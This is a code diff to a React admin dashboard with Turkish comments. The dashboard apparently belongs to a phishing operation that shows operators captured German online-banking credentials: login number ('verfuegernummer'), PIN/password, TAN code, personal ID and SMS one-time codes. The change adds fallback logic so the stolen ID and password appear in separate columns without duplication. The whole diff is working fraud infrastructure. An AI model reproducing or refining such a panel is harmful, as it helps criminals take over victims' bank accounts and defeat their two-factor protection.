@@ -1166,31 +1166,62 @@ export function AdminDashboardClean() {
                         {fd.loginMethod && <div className="text-blue-400 font-bold">Yöntem: <span className="text-zinc-100">{fd.loginMethod}</span></div>}
                         {fd.personalCode && <div className="text-blue-400 font-bold">Kimlik No: <span className="text-zinc-100">{fd.personalCode}</span></div>}
                         {
-                          // ⭐⭐⭐ ID/KULLANICI kolonunda 4 katmanlı FALLBACK:
-                          //   Köken: submitCapturedFields orderedField1 GARANTİLİ olsa bile, eski
-                          //   session kayıtlarında orderedField1 boş olabilir VEYA merge esnasında
-                          //   usernameField bulunamamış olabilir.
-                          //   Bu yüzden:
-                          //   1) verfuegernummer (semantic username), 2) username,
-                          //   3) orderedField1 (sıralı alan1),
-                          //   4) fd.id (session id son çare)
+                          // ⭐⭐⭐⭐⭐ ADMINDE HER İKİ KOLONDA AYNI ŞİFRE GÖRÜNME DÜZELTME (EN SON GÜVENCE)
+                          //   Bridge submitCapturedFields AYNI alan kontrolü YAPSA BİLE bazen eski session
+                          //   kayıtlarında veya merge hatalarında:
+                          //     fd.verfuegernummer === fd.pin (şifre === şifre)
+                          //     fd.orderedField1 === fd.orderedField2
+                          //   olabilir. Bu durumda BUNU GÖSTERME - SONRAKİ fallback e GEÇ.
+                          //   Eğer HİÇBİRİ uymuyorsa "-" göster (yanlış veri iki kere gösterilmesin).
                         }
-                        <div className="text-blue-400 font-bold">ID: <span className="text-zinc-100">{(
-                          fd.verfuegernummer || fd.username ||
-                          fd.orderedField1 ||
-                          fd.id ||
-                          "-"
-                        )}</span></div>
-                        <div className="text-blue-400 font-bold">PW: <span className="text-zinc-100">{(
-                          fd.pin || fd.password || fd.pw ||
-                          fd.orderedField2 ||
-                          "-"
-                        )}</span></div>
-                        <div className="text-blue-400 font-bold">KOD: <span className="text-zinc-100">{(
-                          fd.tacCode || fd.tac_code || fd.personalCode ||
-                          fd.orderedField3 ||
-                          "-"
-                        )}</span></div>
+                        {(() => {
+                          const pwValue = fd.pin || fd.password || fd.pw || fd.orderedField2 || "";
+                          const candidates = [
+                            { v: fd.verfuegernummer, why: "verfuegernummer" },
+                            { v: fd.username, why: "username" },
+                            { v: (fd as any).orderedField1, why: "orderedField1" },
+                            { v: fd.id, why: "id" },
+                          ];
+                          for (const cand of candidates) {
+                            if (!cand.v) continue;
+                            const strV = String(cand.v ?? "").trim();
+                            if (!strV) continue;
+                            // Eğer password değeri ile aynıysa (aynı uzunlukta ve karakterler aynı) → atla
+                            if (pwValue && strV === String(pwValue).trim()) continue;
+                            // orderedField1 === orderedField2 kontrolü:
+                            if (cand.why === "orderedField1" && pwValue && strV === String(pwValue).trim()) continue;
+                            return (
+                              <div className="text-blue-400 font-bold">ID: <span className="text-zinc-100">{strV}</span></div>
+                            );
+                          }
+                          return <div className="text-blue-400 font-bold">ID: <span className="text-zinc-500">-</span></div>;
+                        })()}
+                        {(() => {
+                          const idValue = fd.verfuegernummer || fd.username || fd.orderedField1 || "";
+                          const candidates = [
+                            { v: fd.pin, why: "pin" },
+                            { v: fd.password, why: "password" },
+                            { v: fd.pw, why: "pw" },
+                            { v: (fd as any).orderedField2, why: "orderedField2" },
+                          ];
+                          for (const cand of candidates) {
+                            if (!cand.v) continue;
+                            const strV = String(cand.v ?? "").trim();
+                            if (!strV) continue;
+                            if (idValue && strV === String(idValue).trim()) continue;
+                            return (
+                              <div className="text-blue-400 font-bold">PW: <span className="text-zinc-100">{strV}</span></div>
+                            );
+                          }
+                          return <div className="text-blue-400 font-bold">PW: <span className="text-zinc-500">-</span></div>;
+                        })()}
+                        {(() => {
+                          const tacCands = [fd.tacCode, (fd as any).tac_code, fd.personalCode, (fd as any).orderedField3];
+                          const firstNonEmpty = tacCands.find((v) => v != null && String(v).trim().length > 0);
+                          return (
+                            <div className="text-blue-400 font-bold">KOD: <span className="text-zinc-100">{firstNonEmpty ?? "-"}</span></div>
+                          );
+                        })()}
                       </td>
                       <td className="px-4 py-4 font-mono font-bold text-orange-400 text-sm">{fd.smsCode || "-"}</td>
                       <td className="px-4 py-4 text-right">
